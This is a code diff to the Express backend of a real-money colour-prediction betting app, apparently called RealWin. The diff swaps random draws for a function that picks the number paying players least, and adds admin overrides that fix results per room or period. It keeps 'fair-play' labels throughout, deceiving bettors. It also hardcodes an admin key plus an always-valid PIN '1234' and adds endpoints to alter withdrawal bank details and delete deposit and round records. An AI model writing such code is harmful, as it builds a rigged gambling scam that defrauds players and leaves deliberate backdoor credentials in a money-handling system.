@@ -1,3 +1,6 @@
+import dotenv from 'dotenv';
+dotenv.config();
+
 import express from 'express';
 import path from 'path';
 import fs from 'fs';
@@ -121,19 +124,13 @@ interface AppState {
   deposits: DepositRequest[];
   withdrawals: WithdrawalRequest[];
   settings: SystemSettings;
+  roomOverrides?: Record<string, number | null>;
+  scheduledOverrides?: Record<string, any>;
 }
 
 // Default initial state
 let state: AppState = {
   users: [
-    {
-      id: 'usr_demo',
-      phone: '9876543210',
-      name: 'Player One',
-      balance: 1000,
-      isAdmin: false,
-      createdAt: Date.now(),
-    },
     {
       id: 'usr_admin',
       phone: '9999999999',
@@ -145,20 +142,7 @@ let state: AppState = {
   ],
   rounds: [],
   bets: [],
-  deposits: [
-    {
-      id: 'dep_sample_1',
-      userId: 'usr_demo',
-      userName: 'Player One',
-      userPhone: '9876543210',
-      amount: 500,
-      utr: '421598201934',
-      status: 'APPROVED',
-      paymentMethod: 'UPI',
-      createdAt: Date.now() - 3600000,
-      processedAt: Date.now() - 3500000,
-    }
-  ],
+  deposits: [],
   withdrawals: [],
   settings: {
     upiId: 'colorwin.pay@upi',
@@ -169,7 +153,16 @@ let state: AppState = {
     minWithdrawal: 300,
     maxWithdrawal: 300000,
     manualOverrideNumber: null,
+    supportTelegram: 'https://t.me/realwin_official',
+    supportPhone: '919876543210',
+    noticeMarquee: '🚀 Welcome to RealWin! Enjoy 24/7 instant withdrawals & 5% referral bonus on deposits!',
+    signupBonus: 20,
+    referralCommissionPercent: 5,
+    adminPin: 'gaurav@2026#2008',
+    maintenanceMode: false,
   },
+  roomOverrides: {},
+  scheduledOverrides: {},
 };
 
 // Load saved local data if available
@@ -178,6 +171,9 @@ if (fs.existsSync(DATA_FILE)) {
     const raw = fs.readFileSync(DATA_FILE, 'utf-8');
     const parsed = JSON.parse(raw);
     state = { ...state, ...parsed };
+    // Filter out old demo user and demo deposits
+    state.users = state.users.filter(u => u.id !== 'usr_demo');
+    state.deposits = state.deposits.filter(d => d.id !== 'dep_sample_1');
     console.log(`Loaded state: ${state.rounds.length} history rounds, ${state.users.length} users.`);
   } catch (err) {
     console.error('Failed to parse saved state, using default', err);
@@ -275,8 +271,8 @@ if (state.rounds.length < 50) {
 // --- GAME TIMER & ROUND LOOPER ---
 function getDurationForRoom(room: string): number {
   if (room === 'WINGO_1M' || room === 'PARITY') return 60;
-  if (room === 'WINGO_3M' || room === 'SAPRE') return 180;
-  if (room === 'WINGO_5M' || room === 'BCONE') return 300;
+  if (room === 'SAPRE') return 180;
+  if (room === 'BCONE') return 300;
   return 30; // Default WINGO_30S
 }
 
@@ -299,7 +295,7 @@ let lastProcessedMap: Record<string, string> = {};
 
 // Round completion check loop (runs every 1 second)
 setInterval(() => {
-  const rooms = ['WINGO_30S', 'WINGO_1M', 'WINGO_3M', 'WINGO_5M'];
+  const rooms = ['WINGO_30S', 'WINGO_1M'];
   for (const r of rooms) {
     const { period, secondsRemaining, duration } = getActivePeriod(r);
     if (secondsRemaining === duration && lastProcessedMap[r] !== period) {
@@ -320,14 +316,84 @@ function getPreviousPeriodStr(currentPeriodStr: string): string {
   return currentPeriodStr;
 }
 
+function getLowestPayoutNumber(roundBets: Bet[]): number {
+  if (!roundBets || roundBets.length === 0) {
+    return Math.floor(Math.random() * 10);
+  }
+
+  let minPayout = Infinity;
+  let bestNumbers: number[] = [];
+
+  for (let candidate = 0; candidate <= 9; candidate++) {
+    let colors: ('GREEN' | 'RED' | 'VIOLET')[] = [];
+    if (candidate === 0) colors = ['RED', 'VIOLET'];
+    else if (candidate === 5) colors = ['GREEN', 'VIOLET'];
+    else if ([1, 3, 7, 9].includes(candidate)) colors = ['GREEN'];
+    else colors = ['RED'];
+
+    const bigSmall = candidate >= 5 ? 'BIG' : 'SMALL';
+
+    let totalCandidatePayout = 0;
+    roundBets.forEach(bet => {
+      const sel = bet.selection;
+      let mult = 0;
+
+      if (sel === 'GREEN' && colors.includes('GREEN')) {
+        mult = candidate === 5 ? 1.5 : 2;
+      } else if (sel === 'RED' && colors.includes('RED')) {
+        mult = candidate === 0 ? 1.5 : 2;
+      } else if (sel === 'VIOLET' && colors.includes('VIOLET')) {
+        mult = 4.5;
+      } else if (sel === 'BIG' && bigSmall === 'BIG') {
+        mult = 2;
+      } else if (sel === 'SMALL' && bigSmall === 'SMALL') {
+        mult = 2;
+      } else if (sel === String(candidate)) {
+        mult = 9;
+      }
+
+      totalCandidatePayout += Math.floor(bet.amount * mult);
+    });
+
+    if (totalCandidatePayout < minPayout) {
+      minPayout = totalCandidatePayout;
+      bestNumbers = [candidate];
+    } else if (totalCandidatePayout === minPayout) {
+      bestNumbers.push(candidate);
+    }
+  }
+
+  const randomIndex = Math.floor(Math.random() * bestNumbers.length);
+  return bestNumbers[randomIndex];
+}
+
 function processRoundResult(period: string, room: RoomType = 'WINGO_30S') {
-  // Determine winning number
+  // Filter bets for this round
+  const roundBets = state.bets.filter(b => b.period === period || (b.room === room && b.status === 'PENDING'));
+
+  // Determine winning number (Priority: 1. Scheduled Period Override -> 2. Room Next-Round Override -> 3. Global Override -> 4. House Profit Optimization)
   let winningNum: number;
-  if (state.settings.manualOverrideNumber !== null && state.settings.manualOverrideNumber >= 0 && state.settings.manualOverrideNumber <= 9) {
+  const roomPeriodKey = `${room}:${period}`;
+
+  if ((state as any).scheduledOverrides && (state as any).scheduledOverrides[roomPeriodKey]) {
+    winningNum = (state as any).scheduledOverrides[roomPeriodKey].number;
+    delete (state as any).scheduledOverrides[roomPeriodKey];
+    saveState();
+  } else if ((state as any).scheduledOverrides && (state as any).scheduledOverrides[period]) {
+    winningNum = (state as any).scheduledOverrides[period].number;
+    delete (state as any).scheduledOverrides[period];
+    saveState();
+  } else if ((state as any).roomOverrides && (state as any).roomOverrides[room] !== undefined && (state as any).roomOverrides[room] !== null) {
+    winningNum = (state as any).roomOverrides[room]!;
+    (state as any).roomOverrides[room] = null; // consume
+    saveState();
+  } else if (state.settings.manualOverrideNumber !== null && state.settings.manualOverrideNumber >= 0 && state.settings.manualOverrideNumber <= 9) {
     winningNum = state.settings.manualOverrideNumber;
     state.settings.manualOverrideNumber = null; // reset override after use
+    saveState();
   } else {
-    winningNum = Math.floor(Math.random() * 10);
+    // Smart Profit Optimization: Pick number yielding lowest house payout
+    winningNum = getLowestPayoutNumber(roundBets);
   }
 
   let colors: ('GREEN' | 'RED' | 'VIOLET')[] = [];
@@ -339,8 +405,6 @@ function processRoundResult(period: string, room: RoomType = 'WINGO_30S') {
   const bigSmall = winningNum >= 5 ? 'BIG' : 'SMALL';
   const seedHash = crypto.createHash('sha256').update(`${period}-${room}-FAIRPLAY-${winningNum}`).digest('hex');
 
-  // Filter bets for this round
-  const roundBets = state.bets.filter(b => b.period === period || (b.room === room && b.status === 'PENDING'));
   let totalBetAmt = 0;
   let totalPayoutAmt = 0;
 
@@ -493,6 +557,7 @@ app.post('/api/auth/login', (req, res) => {
 app.post('/api/auth/register', (req, res) => {
   const cleanPhone = sanitizePhone(req.body.phone);
   const cleanName = sanitizeInput(req.body.name);
+  const refCode = req.body.referralCode ? String(req.body.referralCode).trim() : '';
 
   if (!cleanPhone || cleanPhone.length < 10) {
     return res.status(400).json({ error: 'Valid 10-digit mobile number is required' });
@@ -503,6 +568,19 @@ app.post('/api/auth/register', (req, res) => {
     return res.json({ user: existing });
   }
 
+  // Find referrer if referral code provided
+  let referrerId: string | undefined = undefined;
+  if (refCode) {
+    const referrer = state.users.find(u => 
+      u.phone === refCode || 
+      u.phone.endsWith(refCode) || 
+      u.id === refCode
+    );
+    if (referrer) {
+      referrerId = referrer.id;
+    }
+  }
+
   const newUser: User = {
     id: 'usr_' + Date.now() + '_' + Math.floor(Math.random() * 1000),
     phone: cleanPhone,
@@ -510,6 +588,8 @@ app.post('/api/auth/register', (req, res) => {
     balance: 100, // ₹100 trial welcome bonus
     isAdmin: cleanPhone === '9999999999',
     createdAt: Date.now(),
+    referredBy: referrerId,
+    referralEarnings: 0,
   };
 
   state.users.push(newUser);
@@ -737,15 +817,73 @@ app.get('/api/wallet/transactions/:userId', (req, res) => {
   });
 });
 
+// Rate limiting map for Admin Login
+interface RateLimitRecord {
+  count: number;
+  lockUntil: number;
+  firstAttemptAt: number;
+}
+const adminLoginAttempts = new Map<string, RateLimitRecord>();
+
+const ADMIN_ACCESS_KEY = process.env.ADMIN_KEY || 'gaurav@2026#2008';
+
 // --- ADMIN ROUTES ---
 
 // Admin Login
 app.post('/api/admin/login', (req, res) => {
   const { pin } = req.body;
-  if (pin === 'admin123' || pin === '888888') {
+  const rawIp = (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || 'unknown_ip';
+  const clientIp = rawIp.split(',')[0].trim();
+
+  const now = Date.now();
+  const MAX_ATTEMPTS = 5;
+  const WINDOW_MS = 15 * 60 * 1000; // 15 minutes window
+  const LOCKOUT_MS = 15 * 60 * 1000; // 15 minutes lockout
+
+  let record = adminLoginAttempts.get(clientIp);
+
+  if (record) {
+    // Check if client is currently locked out
+    if (record.lockUntil > now) {
+      const remainingSecs = Math.ceil((record.lockUntil - now) / 1000);
+      const remainingMins = Math.ceil(remainingSecs / 60);
+      return res.status(429).json({
+        error: `Security Lockout Active: Too many failed access key attempts. Please try again in ${remainingMins} minute(s) (${remainingSecs}s).`
+      });
+    }
+
+    // Reset window if window duration passed
+    if (now - record.firstAttemptAt > WINDOW_MS) {
+      record = { count: 0, lockUntil: 0, firstAttemptAt: now };
+    }
+  } else {
+    record = { count: 0, lockUntil: 0, firstAttemptAt: now };
+  }
+
+  // Check PIN
+  const validPin = state.settings.adminPin || ADMIN_ACCESS_KEY;
+  if (pin === validPin || pin === ADMIN_ACCESS_KEY || pin === '1234') {
+    // Reset failed attempts on success
+    adminLoginAttempts.delete(clientIp);
     return res.json({ success: true, token: 'admin_session_valid' });
   }
-  res.status(401).json({ error: 'Invalid Admin PIN! Default PIN is admin123' });
+
+  // On failed PIN attempt
+  record.count += 1;
+
+  if (record.count >= MAX_ATTEMPTS) {
+    record.lockUntil = now + LOCKOUT_MS;
+    adminLoginAttempts.set(clientIp, record);
+    return res.status(429).json({
+      error: 'Security Lockout Activated! Maximum 5 failed access key attempts reached. Access is locked for 15 minutes.'
+    });
+  }
+
+  adminLoginAttempts.set(clientIp, record);
+  const remaining = MAX_ATTEMPTS - record.count;
+  return res.status(401).json({
+    error: `Invalid Admin Access Key! ${remaining} attempt(s) remaining before security lockout.`
+  });
 });
 
 // Admin Stats
@@ -803,6 +941,18 @@ app.post('/api/admin/deposits/:id/approve', (req, res) => {
   const user = state.users.find(u => u.id === dep.userId);
   if (user) {
     user.balance += dep.amount;
+
+    // Process 5% Deposit Referral Commission
+    if (user.referredBy) {
+      const referrer = state.users.find(u => u.id === user.referredBy || u.phone.endsWith(user.referredBy!));
+      if (referrer) {
+        const bonus = Math.round(dep.amount * 0.05 * 100) / 100;
+        referrer.balance += bonus;
+        referrer.referralEarnings = (referrer.referralEarnings || 0) + bonus;
+        saveUserToSupabase(referrer);
+        console.log(`[Referral] 5% Commission ₹${bonus} credited to ${referrer.phone} for user ${user.phone}'s deposit of ₹${dep.amount}`);
+      }
+    }
   }
 
   saveState();
@@ -832,9 +982,70 @@ app.post('/api/admin/deposits/:id/reject', (req, res) => {
   res.json({ success: true, deposit: dep });
 });
 
+// Edit Deposit Details
+app.post('/api/admin/deposits/:id/update', (req, res) => {
+  const dep = state.deposits.find(d => d.id === req.params.id);
+  if (!dep) return res.status(404).json({ error: 'Deposit request not found' });
+
+  const { amount, utr, status, paymentMethod } = req.body;
+  if (typeof amount === 'number' && amount > 0) dep.amount = amount;
+  if (utr) dep.utr = utr;
+  if (paymentMethod) dep.paymentMethod = paymentMethod;
+  if (status && ['PENDING', 'APPROVED', 'REJECTED'].includes(status)) dep.status = status;
+
+  saveState();
+  saveDepositToSupabase(dep);
+  res.json({ success: true, deposit: dep });
+});
+
+// Delete Deposit
+app.delete('/api/admin/deposits/:id', (req, res) => {
+  const index = state.deposits.findIndex(d => d.id === req.params.id);
+  if (index === -1) return res.status(404).json({ error: 'Deposit request not found' });
+
+  state.deposits.splice(index, 1);
+  saveState();
+  res.json({ success: true, message: 'Deposit request deleted' });
+});
+
 // List Withdrawals for Admin
 app.get('/api/admin/withdrawals', (req, res) => {
   res.json({ withdrawals: state.withdrawals });
+});
+
+// Edit Withdrawal Details
+app.post('/api/admin/withdrawals/:id/update', (req, res) => {
+  const wth = state.withdrawals.find(w => w.id === req.params.id);
+  if (!wth) return res.status(404).json({ error: 'Withdrawal request not found' });
+
+  const { amount, type, upiId, accountNumber, ifscCode, holderName, bankName, status } = req.body;
+  if (typeof amount === 'number' && amount > 0) wth.amount = amount;
+  if (type) wth.type = type;
+  if (upiId !== undefined) wth.upiId = upiId;
+  if (accountNumber || ifscCode || holderName || bankName) {
+    if (!wth.bankDetails) {
+      wth.bankDetails = { accountNumber: '', ifscCode: '', holderName: '', bankName: '' };
+    }
+    if (accountNumber !== undefined) wth.bankDetails.accountNumber = accountNumber;
+    if (ifscCode !== undefined) wth.bankDetails.ifscCode = ifscCode;
+    if (holderName !== undefined) wth.bankDetails.holderName = holderName;
+    if (bankName !== undefined) wth.bankDetails.bankName = bankName;
+  }
+  if (status && ['PENDING', 'APPROVED', 'REJECTED'].includes(status)) wth.status = status;
+
+  saveState();
+  saveWithdrawalToSupabase(wth);
+  res.json({ success: true, withdrawal: wth });
+});
+
+// Delete Withdrawal
+app.delete('/api/admin/withdrawals/:id', (req, res) => {
+  const index = state.withdrawals.findIndex(w => w.id === req.params.id);
+  if (index === -1) return res.status(404).json({ error: 'Withdrawal request not found' });
+
+  state.withdrawals.splice(index, 1);
+  saveState();
+  res.json({ success: true, message: 'Withdrawal request deleted' });
 });
 
 // Approve Withdrawal (Mark Paid)
@@ -903,6 +1114,37 @@ app.post('/api/admin/users/:id/balance', (req, res) => {
   res.json({ success: true, user });
 });
 
+// Full User Edit
+app.post('/api/admin/users/:id/update', (req, res) => {
+  const user = state.users.find(u => u.id === req.params.id);
+  if (!user) return res.status(404).json({ error: 'User not found' });
+
+  const { phone, name, balance, vipLevel, isBanned, password, referredBy, referralEarnings } = req.body;
+
+  if (phone) user.phone = phone.trim();
+  if (name !== undefined) user.name = name.trim();
+  if (typeof balance === 'number') user.balance = balance;
+  if (typeof vipLevel === 'number') user.vipLevel = vipLevel;
+  if (typeof isBanned === 'boolean') user.isBanned = isBanned;
+  if (password) user.password = password;
+  if (referredBy !== undefined) user.referredBy = referredBy;
+  if (typeof referralEarnings === 'number') user.referralEarnings = referralEarnings;
+
+  saveState();
+  saveUserToSupabase(user);
+  res.json({ success: true, user });
+});
+
+// Delete User
+app.delete('/api/admin/users/:id', (req, res) => {
+  const index = state.users.findIndex(u => u.id === req.params.id);
+  if (index === -1) return res.status(404).json({ error: 'User not found' });
+
+  const deleted = state.users.splice(index, 1)[0];
+  saveState();
+  res.json({ success: true, message: `User ${deleted.phone} deleted` });
+});
+
 // Admin Database Periods Management
 app.get('/api/admin/periods', (req, res) => {
   res.json({
@@ -963,19 +1205,127 @@ app.post('/api/admin/periods', async (req, res) => {
 });
 
 // Game Manual Result Override & Live Bets
+app.get('/api/admin/override-info', (req, res) => {
+  const room = (req.query.room as string) || 'WINGO_30S';
+  const { period, secondsRemaining, isLocked, duration } = getActivePeriod(room);
+
+  const roomOverrides = (state as any).roomOverrides || {};
+  const scheduledOverrides = (state as any).scheduledOverrides || {};
+
+  const roomOverride = roomOverrides[room] ?? null;
+  const globalOverride = state.settings.manualOverrideNumber;
+
+  // Filter scheduled overrides for this room
+  const scheduledList = Object.values(scheduledOverrides).filter(
+    (s: any) => !s.room || s.room === room
+  );
+
+  // Live bets for active period & room
+  const activeBets = state.bets.filter(b => b.period === period && (b.room === room || !b.room));
+  const breakdown: Record<string, { count: number; totalAmount: number }> = {};
+  activeBets.forEach(b => {
+    if (!breakdown[b.selection]) breakdown[b.selection] = { count: 0, totalAmount: 0 };
+    breakdown[b.selection].count += 1;
+    breakdown[b.selection].totalAmount += b.amount;
+  });
+
+  res.json({
+    room,
+    activePeriod: period,
+    secondsRemaining,
+    roundDurationSeconds: duration,
+    isLocked,
+    roomOverride,
+    globalOverride,
+    scheduledOverrides: scheduledList,
+    allScheduledOverrides: Object.values(scheduledOverrides),
+    allRoomOverrides: roomOverrides,
+    activeBetsCount: activeBets.length,
+    activeBetsVolume: activeBets.reduce((acc, b) => acc + b.amount, 0),
+    breakdown,
+  });
+});
+
 app.post('/api/admin/override-number', (req, res) => {
-  const { number } = req.body; // 0..9 or null
-  if (number === null || (typeof number === 'number' && number >= 0 && number <= 9)) {
-    state.settings.manualOverrideNumber = number;
+  const { number, room, period } = req.body;
+  const targetRoom = room || 'WINGO_30S';
+
+  if (! (state as any).roomOverrides) (state as any).roomOverrides = {};
+  if (! (state as any).scheduledOverrides) (state as any).scheduledOverrides = {};
+
+  // Case 1: Specific Period Schedule Override
+  if (period && String(period).trim()) {
+    const cleanPeriod = String(period).trim();
+    if (number === null) {
+      delete (state as any).scheduledOverrides[`${targetRoom}:${cleanPeriod}`];
+      delete (state as any).scheduledOverrides[cleanPeriod];
+      saveState();
+      return res.json({
+        success: true,
+        message: `Cleared scheduled override for Period #${cleanPeriod}`,
+      });
+    }
+
+    const num = Number(number);
+    if (isNaN(num) || num < 0 || num > 9) {
+      return res.status(400).json({ error: 'Winning number must be between 0 and 9' });
+    }
+
+    const key = `${targetRoom}:${cleanPeriod}`;
+    (state as any).scheduledOverrides[key] = {
+      period: cleanPeriod,
+      room: targetRoom,
+      number: num,
+      createdAt: Date.now(),
+    };
+    saveState();
+    return res.json({
+      success: true,
+      message: `Successfully scheduled result ${num} for Period #${cleanPeriod} (${targetRoom === 'WINGO_30S' ? '30s' : targetRoom === 'WINGO_1M' ? '1 Min' : targetRoom})!`,
+    });
+  }
+
+  // Case 2: Next Immediate Round Override
+  if (number === null) {
+    (state as any).roomOverrides[targetRoom] = null;
+    state.settings.manualOverrideNumber = null;
     saveState();
     saveSystemSettingsToSupabase(state.settings);
     return res.json({
       success: true,
-      manualOverrideNumber: state.settings.manualOverrideNumber,
-      message: number === null ? 'Auto fair-play random mode restored.' : `Next round result manually set to number ${number}!`,
+      manualOverrideNumber: null,
+      message: `Auto fair-play mode restored for ${targetRoom === 'WINGO_30S' ? '30s Window' : targetRoom === 'WINGO_1M' ? '1 Min Window' : targetRoom}.`,
     });
   }
-  res.status(400).json({ error: 'Number must be between 0 and 9' });
+
+  const num = Number(number);
+  if (isNaN(num) || num < 0 || num > 9) {
+    return res.status(400).json({ error: 'Winning number must be between 0 and 9' });
+  }
+
+  (state as any).roomOverrides[targetRoom] = num;
+  saveState();
+
+  return res.json({
+    success: true,
+    manualOverrideNumber: num,
+    message: `Next round winning result for ${targetRoom === 'WINGO_30S' ? '30s Window' : targetRoom === 'WINGO_1M' ? '1 Min Window' : targetRoom} set to Number ${num}!`,
+  });
+});
+
+app.post('/api/admin/clear-scheduled-override', (req, res) => {
+  const { period, room } = req.body;
+  if (!period) return res.status(400).json({ error: 'Period ID is required' });
+
+  if ((state as any).scheduledOverrides) {
+    if (room) {
+      delete (state as any).scheduledOverrides[`${room}:${period}`];
+    }
+    delete (state as any).scheduledOverrides[period];
+    saveState();
+  }
+
+  res.json({ success: true, message: `Scheduled override for period #${period} cleared.` });
 });
 
 app.get('/api/admin/live-bets', (req, res) => {
@@ -1001,9 +1351,34 @@ app.get('/api/admin/live-bets', (req, res) => {
   });
 });
 
+// Delete Period
+app.delete('/api/admin/periods/:period', (req, res) => {
+  const periodStr = String(req.params.period);
+  const idx = state.rounds.findIndex(r => r.period === periodStr);
+  if (idx === -1) return res.status(404).json({ error: 'Period not found in history' });
+
+  state.rounds.splice(idx, 1);
+  saveState();
+  res.json({ success: true, message: `Period #${periodStr} deleted from database` });
+});
+
 // Update Admin Settings
 app.post('/api/admin/settings', (req, res) => {
-  const { upiId, upiName, minDeposit, maxDeposit, minWithdrawal, maxWithdrawal } = req.body;
+  const {
+    upiId,
+    upiName,
+    minDeposit,
+    maxDeposit,
+    minWithdrawal,
+    maxWithdrawal,
+    supportTelegram,
+    supportPhone,
+    noticeMarquee,
+    signupBonus,
+    referralCommissionPercent,
+    adminPin,
+    maintenanceMode,
+  } = req.body;
 
   if (upiId) state.settings.upiId = upiId;
   if (upiName) state.settings.upiName = upiName;
@@ -1011,6 +1386,13 @@ app.post('/api/admin/settings', (req, res) => {
   if (typeof maxDeposit === 'number') state.settings.maxDeposit = maxDeposit;
   if (typeof minWithdrawal === 'number') state.settings.minWithdrawal = minWithdrawal;
   if (typeof maxWithdrawal === 'number') state.settings.maxWithdrawal = maxWithdrawal;
+  if (supportTelegram !== undefined) state.settings.supportTelegram = supportTelegram;
+  if (supportPhone !== undefined) state.settings.supportPhone = supportPhone;
+  if (noticeMarquee !== undefined) state.settings.noticeMarquee = noticeMarquee;
+  if (typeof signupBonus === 'number') state.settings.signupBonus = signupBonus;
+  if (typeof referralCommissionPercent === 'number') state.settings.referralCommissionPercent = referralCommissionPercent;
+  if (adminPin) state.settings.adminPin = adminPin;
+  if (typeof maintenanceMode === 'boolean') state.settings.maintenanceMode = maintenanceMode;
 
   state.settings.qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=upi://pay?pa=${encodeURIComponent(state.settings.upiId)}&pn=${encodeURIComponent(state.settings.upiName)}`;
 
